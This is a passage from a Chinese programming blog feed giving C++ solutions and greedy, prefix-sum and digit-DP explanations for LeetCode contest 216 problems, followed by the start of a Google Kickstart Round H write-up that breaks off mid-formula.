s1 += w;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> w : word2) s2 += w;</span><br><span class="line">        <span class="keyword">if</span>(s1 != s2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5606-具有给定数值的最小字符串"><a href="#5606-具有给定数值的最小字符串" class="headerlink" title="5606. 具有给定数值的最小字符串"></a>5606. 具有给定数值的最小字符串</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>小写字符 的 数值 是它在字母表中的位置（从 1 开始），因此 a 的数值为 1 ，b 的数值为 2 ，c 的数值为 3 ，以此类推。</p><p>字符串由若干小写字符组成，字符串的数值 为各字符的数值之和。例如，字符串 “abe” 的数值等于 <code>1 + 2 + 5 = 8</code>。</p><p>给你两个整数<code>n</code>和 <code>k</code>。返回 长度 等于 n 且 数值 等于 k 的 字典序最小 的字符串。</p><p>注意，如果字符串 x 在字典排序中位于 y 之前，就认为 x 字典序比 y 小，有以下两种情况：</p><p>x 是 y 的一个前缀；<br>如果 i 是 <code>x[i] != y[i]</code>的第一个位置，且<code>x[i]</code>在字母表中的位置比 <code>y[i]</code> 靠前。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span>, k = <span class="number">27</span></span><br><span class="line">输出：<span class="string">"aay"</span></span><br><span class="line">解释：字符串的数值为 <span class="number">1</span> + <span class="number">1</span> + <span class="number">25</span> = <span class="number">27</span>，它是数值满足要求且长度等于 <span class="number">3</span> 字典序最小的字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">5</span>, k = <span class="number">73</span></span><br><span class="line">输出：<span class="string">"aaszz"</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 105</code></li><li><code>n &lt;= k &lt;= 26 * n</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/smallest-string-with-a-given-numeric-value" target="_blank" rel="noopener">https://leetcode-cn.com/problems/smallest-string-with-a-given-numeric-value</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>题目其实很简单，给定总值求字典序最小的目标串，所以我们每次让最左边的字符尽可能的小即可，假设进行到第<code>i</code>位，且当前剩余剩余的字符的和为<code>sum</code>,则此时该字符应该为:<script type="math/tex; mode=display">s[i] = min(1,sum - (n-i)*26)  + ('a' - 1)</script>贪心法，即尽可能的让当前位最小即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getSmallestString</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = max(<span class="number">1</span>,k - (n-i)*<span class="number">26</span>);</span><br><span class="line">            k -= x;</span><br><span class="line">            ans.push_back(<span class="string">'a'</span> + x - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5607-生成平衡数组的方案数"><a href="#5607-生成平衡数组的方案数" class="headerlink" title="5607. 生成平衡数组的方案数"></a>5607. 生成平衡数组的方案数</h2><p>给你一个整数数组 <code>nums</code> 。你需要选择 恰好 一个下标（下标从 <code>0</code> 开始）并删除对应的元素。请注意剩下元素的下标可能会因为删除操作而发生改变。</p><p>比方说，如果 <code>nums = [6,1,7,4,1]</code>，那么：</p><ul><li>选择删除下标 1 ，剩下的数组为 nums = [6,7,4,1] 。</li><li>选择删除下标 2 ，剩下的数组为 nums = [6,1,4,1] 。</li><li>选择删除下标 4 ，剩下的数组为 nums = [6,1,7,4] 。<br>如果一个数组满足奇数下标元素的和与偶数下标元素的和相等，该数组就是一个 平衡数组 。</li></ul><p>请你返回删除操作后，剩下的数组 <code>nums</code>是 平衡数组 的 方案数 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：</span><br><span class="line">删除下标 <span class="number">0</span> ：[<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">1</span> + <span class="number">4</span> = <span class="number">5</span> 。奇数元素下标为：<span class="number">6</span> 。不平衡。</span><br><span class="line">删除下标 <span class="number">1</span> ：[<span class="number">2</span>,<span class="number">6</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span> 。奇数元素下标为：<span class="number">6</span> 。平衡。</span><br><span class="line">删除下标 <span class="number">2</span> ：[<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span> 。奇数元素下标为：<span class="number">1</span> 。不平衡。</span><br><span class="line">删除下标 <span class="number">3</span> ：[<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>] -&gt; 偶数元素下标为：<span class="number">2</span> + <span class="number">6</span> = <span class="number">8</span> 。奇数元素下标为：<span class="number">1</span> 。不平衡。</span><br><span class="line">只有一种让剩余数组成为平衡数组的方案。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：你可以删除任意元素，剩余数组都是平衡数组。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：不管删除哪个元素，剩下数组都不是平衡数组。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/ways-to-make-a-fair-array" target="_blank" rel="noopener">https://leetcode-cn.com/problems/ways-to-make-a-fair-array</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口 + 前缀和</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>这个题目非常简单，我们只需要求出第<code>i</code>时的偶数位前缀和与奇数位的前缀和，其实非常简单。</li><li>本次我们每次删除第<code>i</code>位时，则此时我们只需要根据求和公式，删除第<code>i</code>的数时，剩余构成的数组的奇数位的和与偶数位的和分别为:<script type="math/tex; mode=display">oddsum = odd[i-1] + even[n-1] - even[i] \\evensum = even[i-1] + odd[n-1] - odd[i] \\</script><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">waysToMakeFair</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; even(n,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; odd(n,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        even[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)&#123; <span class="comment">//even</span></span><br><span class="line">                even[i] = even[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">                odd[i] = odd[i<span class="number">-1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">//odd</span></span><br><span class="line">                even[i] = even[i<span class="number">-1</span>];</span><br><span class="line">                odd[i] = odd[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> evensum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> oddsum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                oddsum = even[n<span class="number">-1</span>] - even[<span class="number">0</span>];</span><br><span class="line">                evensum = odd[n<span class="number">-1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                evensum = even[i<span class="number">-1</span>] + odd[n<span class="number">-1</span>] - odd[i];</span><br><span class="line">                oddsum = odd[i<span class="number">-1</span>] + even[n<span class="number">-1</span>] - even[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(evensum == oddsum) ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5608-完成所有任务的最少初始能量"><a href="#5608-完成所有任务的最少初始能量" class="headerlink" title="5608. 完成所有任务的最少初始能量"></a>5608. 完成所有任务的最少初始能量</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个任务数组 <code>tasks</code>，其中 <code>tasks[i] = [actuali, minimumi]</code> ：</p><ul><li><code>actuali</code> 是完成第 <code>i</code> 个任务 需要耗费 的实际能量。</li><li><code>minimumi</code> 是开始第 <code>i</code> 个任务前需要达到的最低能量。<br>比方说，如果任务为 <code>[10, 12]</code> 且你当前的能量为<code>11</code>，那么你不能开始这个任务。如果你当前的能量为 <code>13</code>，你可以完成这个任务，且完成它后剩余能量为 <code>3</code> 。</li></ul><p>你可以按照 任意顺序 完成任务。</p><p>请你返回完成所有任务的 最少 初始能量。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">4</span>,<span class="number">8</span>]]</span><br><span class="line">输出：<span class="number">8</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">8</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">8</span> - <span class="number">4</span> = <span class="number">4</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">4</span> - <span class="number">2</span> = <span class="number">2</span> 。</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">2</span> - <span class="number">1</span> = <span class="number">1</span> 。</span><br><span class="line">注意到尽管我们有能量剩余，但是如果一开始只有 <span class="number">7</span> 能量是不能完成所有任务的，因为我们无法开始第 <span class="number">3</span> 个任务。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">10</span>,<span class="number">11</span>],[<span class="number">10</span>,<span class="number">12</span>],[<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">输出：<span class="number">32</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">32</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">32</span> - <span class="number">1</span> = <span class="number">31</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">31</span> - <span class="number">2</span> = <span class="number">29</span> 。</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">29</span> - <span class="number">10</span> = <span class="number">19</span> 。</span><br><span class="line">    - 完成第 <span class="number">4</span> 个任务，剩余能量为 <span class="number">19</span> - <span class="number">10</span> = <span class="number">9</span> 。</span><br><span class="line">    - 完成第 <span class="number">5</span> 个任务，剩余能量为 <span class="number">9</span> - <span class="number">8</span> = <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：tasks = [[<span class="number">1</span>,<span class="number">7</span>],[<span class="number">2</span>,<span class="number">8</span>],[<span class="number">3</span>,<span class="number">9</span>],[<span class="number">4</span>,<span class="number">10</span>],[<span class="number">5</span>,<span class="number">11</span>],[<span class="number">6</span>,<span class="number">12</span>]]</span><br><span class="line">输出：<span class="number">27</span></span><br><span class="line">解释：</span><br><span class="line">一开始有 <span class="number">27</span> 能量，我们按照如下顺序完成任务：</span><br><span class="line">    - 完成第 <span class="number">5</span> 个任务，剩余能量为 <span class="number">27</span> - <span class="number">5</span> = <span class="number">22</span> 。</span><br><span class="line">    - 完成第 <span class="number">2</span> 个任务，剩余能量为 <span class="number">22</span> - <span class="number">2</span> = <span class="number">20</span> 。</span><br><span class="line">    - 完成第 <span class="number">3</span> 个任务，剩余能量为 <span class="number">20</span> - <span class="number">3</span> = <span class="number">17</span> 。</span><br><span class="line">    - 完成第 <span class="number">1</span> 个任务，剩余能量为 <span class="number">17</span> - <span class="number">1</span> = <span class="number">16</span> 。</span><br><span class="line">    - 完成第 <span class="number">4</span> 个任务，剩余能量为 <span class="number">16</span> - <span class="number">4</span> = <span class="number">12</span> 。</span><br><span class="line">    - 完成第 <span class="number">6</span> 个任务，剩余能量为 <span class="number">12</span> - <span class="number">6</span> = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= tasks.length &lt;= 105</code></li><li><code>1 &lt;= actual​i &lt;= minimumi &lt;= 104</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目稍微思考了一下，我们首先思考一下，首先我们知道最小的初始能量即为所有任务消耗的能量的总和，如果小于该值，任务就不可能完成。</li><li>我们首先需要观察一下，为什么要用贪心。因为我们知道假如第<code>i</code>个任务的消耗能量与最低能量相等，则此时该任务几乎不会对最终结果有很大影响，影响最大的肯定是最低能量远大于消耗能量的任务。如果在此情况下，我们可以利用排序，首先将对结果影响最大的任务首先完成，则我们按照$minimum_{i} - actual_{i}$的大小进行排序即可。</li><li>这个需要严格的数学证明，虽然题目做出来了，但是还没有想好严格的数学证明。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; a,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> da = a[<span class="number">1</span>]-a[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> db = b[<span class="number">1</span>]-b[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(da == db) <span class="keyword">return</span> a[<span class="number">0</span>] &gt; b[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> da &gt; db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumEffort</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; tasks)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = tasks.size();</span><br><span class="line">        <span class="keyword">int</span> require = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) ans += tasks[i][<span class="number">0</span>];</span><br><span class="line">        sort(tasks.begin(),tasks.end(),cmp);</span><br><span class="line">        <span class="keyword">int</span> curr = ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(curr &lt; tasks[i][<span class="number">1</span>])&#123;</span><br><span class="line">                ans += tasks[i][<span class="number">1</span>] - curr;</span><br><span class="line">                curr = tasks[i][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            curr -= tasks[i][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-216&quot;&gt;&lt;a href=&quot;#leetcode-contest-216&quot; class=&quot;headerlink&quot; title=&quot;leetcode  contest 216&quot;&gt;&lt;/a&gt;leetcode  contest 216&lt;/h1&gt;&lt;p&gt;本周最后一题基本上绝大部分人都做出来了，看来还是比较简单的contest。因为前三题基本上都是送分题。&lt;br&gt;试了虚拟竞赛，大概40分钟搞定，估计排名也就在200名左右，前三题确实太简单了。&lt;/p&gt;&lt;h2 id=&quot;5605-检查两个字符串数组是否相等&quot;&gt;&lt;a href=&quot;#5605-检查两个字符串数组是否相等&quot; class=&quot;headerlink&quot; title=&quot;5605. 检查两个字符串数组是否相等&quot;&gt;&lt;/a&gt;5605. 检查两个字符串数组是否相等&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你两个字符串数组 &lt;code&gt;word1&lt;/code&gt;和 &lt;code&gt;word2&lt;/code&gt; 。如果两个数组表示的字符串相同，返回 &lt;code&gt;true&lt;/code&gt;；否则，返回 &lt;code&gt;false&lt;/code&gt; 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Google Kickstart】  roundH</title>
    <link href="http://yoursite.com/2020/11/20/227/"/>
    <id>http://yoursite.com/2020/11/20/227/</id>
    <published>2020-11-20T04:21:13.052Z</published>
    <updated>2020-11-20T09:24:04.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="google-kickstart-round-H"><a href="#google-kickstart-round-H" class="headerlink" title="google kickstart round H"></a>google kickstart round H</h1><p><code>google kick start</code>的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</p><h2 id="Problem-A-Retype"><a href="#Problem-A-Retype" class="headerlink" title="Problem A - Retype"></a>Problem A - Retype</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>选择游戏重启的位置</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第<code>s</code>关开始。<script type="math/tex; mode=display">minT = k + min(n,k+n-2*s)</script><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k,s;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + min(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="Boring-Numbers"><a href="#Boring-Numbers" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul><li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 数位<code>dp</code></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<script type="math/tex; mode=display">ans = count(R) - count(L-1)</script></li><li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<script type="math/tex; mode=display">n = bits(x) \\count[x] = X_{lower} + X_{equal} \\X_{lower} = \sum_{i=1}^{n-1}5^{i}</script></li></ol><ul><li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<script type="math/tex; mode=display">dp[i][1] = dp[i-1][1]*5 + dp[i-1][0]*(X[i]/2) \\X_{equal} = 